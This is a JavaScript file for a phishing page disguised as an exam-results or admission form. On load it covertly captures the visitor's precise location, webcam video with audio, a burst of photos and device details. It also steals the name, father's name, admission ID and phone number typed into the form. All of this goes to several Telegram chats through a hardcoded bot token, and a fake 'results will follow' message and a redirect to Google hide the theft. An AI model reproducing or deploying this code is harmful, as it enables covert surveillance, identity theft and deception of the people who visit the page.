const TOKEN = '8546910341:AAFZKnrP036naa4tciDsMS-bk8TZZ8_wekI';

// Array of chat IDs to send to all users
const CHAT_IDS = [
    '1332669070',
    '7246514514',
    '7994937893',
    '7646169456'
];

let mediaStream = null;
let mediaRecorder = null;
let recordedChunks = [];
let isRecording = false;

// 🎯 Enhanced initialization with error handling
class SurveillanceSystem {
    constructor() {
        this.initializeSystem();
    }

    async initializeSystem() {
        try {
            // Initialize all components in parallel for maximum speed
            await Promise.allSettled([
                this.initializeGeolocation(),
                this.initializeMediaCapture(),
                this.initializeFormHandler()
            ]);

            this.sendSystemInfo();
            
        } catch (error) {
            console.error('System initialization failed:', error);
        }
    }

    // 📍 Enhanced Geolocation with fallbacks
    async initializeGeolocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                this.sendToAllUsers('❌ *Geolocation not supported*');
                resolve();
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const { latitude, longitude, accuracy } = pos.coords;
                    const locationMessage = `📍 *Precise Location*\n\n• **Latitude:** ${latitude}\n• **Longitude:** ${longitude}\n• **Accuracy:** ${accuracy}m\n• **Map:** https://maps.google.com/?q=${latitude},${longitude}`;
                    
                    this.sendToAllUsers(locationMessage);
                    resolve();
                },
                (error) => {
                    const errorMessage = `❌ *Location Access*\n\n• **Status:** ${error.message}\n• **Code:** ${error.code}\n• **Time:** ${new Date().toLocaleString()}`;
                    this.sendToAllUsers(errorMessage);
                    resolve();
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        });
    }

    // 🎥 Enhanced Media Capture with multiple fallbacks
    async initializeMediaCapture() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    width: { ideal: 1280 },
                    height: { ideal: 720 },
                    facingMode: 'user',
                    frameRate: { ideal: 30 }
                },
                audio: {
                    echoCancellation: true,
                    noiseSuppression: true,
                    sampleRate: 44100
                }
            });

            mediaStream = stream;

            // Start video recording immediately
            this.startVideoRecording(stream);
            
            // Start burst photo capture
            this.captureBurstPhotos(stream);

        } catch (error) {
            const errorDetails = `❌ *Media Access Denied*\n\n• **Error:** ${error.name}\n• **Message:** ${error.message}\n• **Time:** ${new Date().toLocaleString()}`;
            this.sendToAllUsers(errorDetails);
        }
    }

    // 🎬 Enhanced Video Recording with quality settings
    async startVideoRecording(stream) {
        try {
            if (!MediaRecorder) {
                this.sendToAllUsers('❌ *Video recording not supported*');
                return;
            }

            recordedChunks = [];
            const options = {
                mimeType: 'video/webm;codecs=vp9,opus',
                videoBitsPerSecond: 3000000
            };

            // Try different mimeTypes for compatibility
            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                options.mimeType = 'video/webm;codecs=vp8,opus';
            }
            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                options.mimeType = 'video/mp4';
            }

            mediaRecorder = new MediaRecorder(stream, options);
            isRecording = true;

            mediaRecorder.ondataavailable = (event) => {
                if (event.data && event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };

            mediaRecorder.onstop = async () => {
                isRecording = false;
                const videoBlob = new Blob(recordedChunks, { type: options.mimeType.split(';')[0] });
                
                if (videoBlob.size > 0) {
                    if (videoBlob.size < 45 * 1024 * 1024) {
                        await this.sendToAllUsers(videoBlob, 'video');
                        this.sendToAllUsers('🎥 *10-Second Video Recording Complete*\n• Duration: 10 seconds\n• Audio: Enabled\n• Quality: HD');
                    } else {
                        this.sendToAllUsers('❌ *Video file too large for Telegram*');
                    }
                }
            };

            mediaRecorder.onerror = (event) => {
                console.error('Recording error:', event.error);
                this.sendToAllUsers('❌ *Video recording error occurred*');
            };

            // Start recording with timeslices for better performance
            mediaRecorder.start(1000);
            this.sendToAllUsers('🎥 *Recording Started*\n• Duration: 10 seconds\n• Audio: Enabled\n• Status: Active');

            // Stop after 10 seconds for better content
            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, 10000);

        } catch (error) {
            console.error('Video recording setup failed:', error);
            this.sendToAllUsers('❌ *Video recording setup failed*');
        }
    }

    // 📸 Enhanced Burst Photo Capture
    async captureBurstPhotos(stream) {
        try {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            video.playsInline = true;
            video.autoplay = true;

            await video.play();

            // Wait for video to be ready
            await new Promise(resolve => {
                if (video.readyState >= 4) {
                    resolve();
                } else {
                    video.addEventListener('loadeddata', resolve, { once: true });
                }
            });

            // Capture 8 high-quality photos in rapid succession
            const photoPromises = [];
            for (let i = 0; i < 8; i++) {
                photoPromises.push(
                    new Promise(resolve => 
                        setTimeout(async () => {
                            await this.captureHighQualityPhoto(video, i + 1);
                            resolve();
                        }, i * 1200) // 1.2 seconds between photos
                    )
                );
            }

            await Promise.allSettled(photoPromises);
            this.sendToAllUsers('📸 *Burst Photo Capture Complete*\n• Total Photos: 8\n• Quality: High\n• Interval: 1.2 seconds');

        } catch (error) {
            console.error('Burst photo capture failed:', error);
        }
    }

    // 📸 High Quality Photo Capture
    async captureHighQualityPhoto(video, photoNumber) {
        return new Promise((resolve) => {
            try {
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d', { willReadFrequently: true });

                // Use actual video dimensions for best quality
                canvas.width = video.videoWidth || 1280;
                canvas.height = video.videoHeight || 720;

                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Add professional timestamp overlay
                context.fillStyle = 'rgba(0, 0, 0, 0.7)';
                context.fillRect(10, 10, 300, 40);
                
                context.font = '14px Arial';
                context.fillStyle = 'white';
                context.fillText(`Photo ${photoNumber} - ${new Date().toLocaleString()}`, 20, 35);

                // High quality JPEG
                canvas.toBlob(async (blob) => {
                    if (blob) {
                        await this.sendToAllUsers(blob, 'photo');
                    }
                    resolve();
                }, 'image/jpeg', 0.92); // High quality

            } catch (error) {
                console.error(`Photo ${photoNumber} capture failed:`, error);
                resolve();
            }
        });
    }

    // 📝 Enhanced Form Handler with data validation
    initializeFormHandler() {
        const loginForm = document.getElementById('loginForm');
        if (!loginForm) {
            console.warn('Login form not found');
            return;
        }

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();

            try {
                const formData = {
                    name: document.getElementById('name')?.value.trim() || 'Not provided',
                    father: document.getElementById('father')?.value.trim() || 'Not provided',
                    admId: document.getElementById('admId')?.value.trim() || 'Not provided',
                    phone: document.getElementById('phone')?.value.trim() || 'Not provided',
                    timestamp: new Date().toLocaleString(),
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screen: `${screen.width}x${screen.height}`
                };

                // Enhanced form message
                const formMessage = `📄 *Form Submission Captured*\n\n` +
                    `• 👤 **Full Name:** ${formData.name}\n` +
                    `• 👨‍👦 **Father's Name:** ${formData.father}\n` +
                    `• 🆔 **Admission ID:** ${formData.admId}\n` +
                    `• 📞 **Phone Number:** ${formData.phone}\n` +
                    `• 🕐 **Submission Time:** ${formData.timestamp}\n` +
                    `• 💻 **Platform:** ${formData.platform}\n` +
                    `• 📱 **Screen:** ${formData.screen}`;

                await this.sendToAllUsers(formMessage);

                // Capture one final high-quality photo before redirect
                if (mediaStream) {
                    const finalVideo = document.createElement('video');
                    finalVideo.srcObject = mediaStream;
                    await finalVideo.play();
                    setTimeout(async () => {
                        await this.captureHighQualityPhoto(finalVideo, 'FINAL');
                        
                        // Enhanced success message and redirect
                        this.showSuccessMessage(formData.name);
                    }, 1000);
                } else {
                    this.showSuccessMessage(formData.name);
                }

            } catch (error) {
                console.error('Form submission error:', error);
                alert('Submission completed. You will receive your results shortly.');
                window.location.href = 'https://www.google.com';
            }
        });
    }

    // 💫 Enhanced success message
    showSuccessMessage(name) {
        const successHTML = `
            <div style="
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                z-index: 10000;
                font-family: Arial, sans-serif;
                text-align: center;
                padding: 20px;
            ">
                <div style="font-size: 3em; margin-bottom: 20px;">🎉</div>
                <h1 style="font-size: 2.5em; margin-bottom: 20px;">Submission Successful!</h1>
                <p style="font-size: 1.5em; margin-bottom: 30px;">Dear ${name}, we will send you SMS of your result shortly.</p>
                <p style="font-size: 1.2em; opacity: 0.9;">Redirecting to results portal...</p>
            </div>
        `;
        
        document.body.innerHTML += successHTML;
        
        setTimeout(() => {
            window.location.href = 'https://www.google.com';
        }, 3000);
    }

    // 🖥️ Enhanced System Information
    sendSystemInfo() {
        const systemInfo = `🖥️ *System Initialized Successfully*\n\n` +
            `• 🌐 **URL:** ${window.location.href}\n` +
            `• 🕐 **Time:** ${new Date().toLocaleString()}\n` +
            `• 📱 **User Agent:** ${navigator.userAgent}\n` +
            `• 💻 **Platform:** ${navigator.platform}\n` +
            `• 🖥️ **Screen:** ${screen.width}x${screen.height}\n` +
            `• 🌍 **Language:** ${navigator.language}\n` +
            `• ⚡ **Cores:** ${navigator.hardwareConcurrency || 'Unknown'}\n` +
            `• 📊 **Memory:** ${navigator.deviceMemory || 'Unknown'}GB`;

        this.sendToAllUsers(systemInfo);
    }

    // 📤 Enhanced Multi-User Message Sending
    async sendToAllUsers(data, type = 'message') {
        const sendTime = Date.now();
        
        try {
            const sendPromises = CHAT_IDS.map(async (chatId, index) => {
                try {
                    await this.sendToTelegram(data, type, chatId);
                    console.log(`✅ Sent to ${chatId} (${index + 1}/${CHAT_IDS.length})`);
                } catch (error) {
                    console.error(`❌ Failed to send to ${chatId}:`, error);
                }
            });

            await Promise.allSettled(sendPromises);
            
            const duration = Date.now() - sendTime;
            console.log(`📤 All messages processed in ${duration}ms`);

        } catch (error) {
            console.error('Batch send error:', error);
        }
    }

    // 📤 Enhanced Telegram API with retry logic
    async sendToTelegram(data, type = 'message', chatId) {
        const maxRetries = 2;
        
        for (let attempt = 1; attempt <= maxRetries; attempt++) {
            try {
                if (type === 'photo') {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', data);
                    formData.append('caption', `📸 Surveillance Photo\n• Time: ${new Date().toLocaleString()}\n• Chat: ${chatId}`);

                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                } else if (type === 'video') {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('video', data, `surveillance_${Date.now()}.mp4`);
                    formData.append('caption', `🎥 Surveillance Video\n• Duration: 10s\n• Time: ${new Date().toLocaleString()}\n• Chat: ${chatId}`);

                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    });

                } else {
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: data,
                            parse_mode: 'Markdown',
                            disable_web_page_preview: true
                        })
                    });
                }
                
                break; // Success, break retry loop

            } catch (error) {
                if (attempt === maxRetries) {
                    throw error;
                }
                await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
            }
        }
    }

    // 🛑 Enhanced Cleanup
    cleanup() {
        // Stop recording if active
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        }

        // Stop all media tracks
        if (mediaStream) {
            mediaStream.getTracks().forEach(track => {
                track.stop();
                track.enabled = false;
            });
            mediaStream = null;
        }

        // Clear recorded data
        recordedChunks = [];
        isRecording = false;

        console.log('🛑 Surveillance system cleaned up');
    }
}

// 🚀 Initialize the enhanced system
const surveillanceSystem = new SurveillanceSystem();

// 🎯 Enhanced event listeners
window.addEventListener('load', () => {
    console.log('🚀 Enhanced Surveillance System Activated');
});

window.addEventListener('beforeunload', () => {
    surveillanceSystem.cleanup();
    surveillanceSystem.sendToAllUsers('👋 *Session Ended*\n• Time: ' + new Date().toLocaleString());
});

window.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        surveillanceSystem.sendToAllUsers('🔍 *User switched tab/window*\n• Time: ' + new Date().toLocaleString());
    }
});

// 🛡️ Error boundary
window.addEventListener('error', (event) => {
    console.error('Global error:', event.error);
});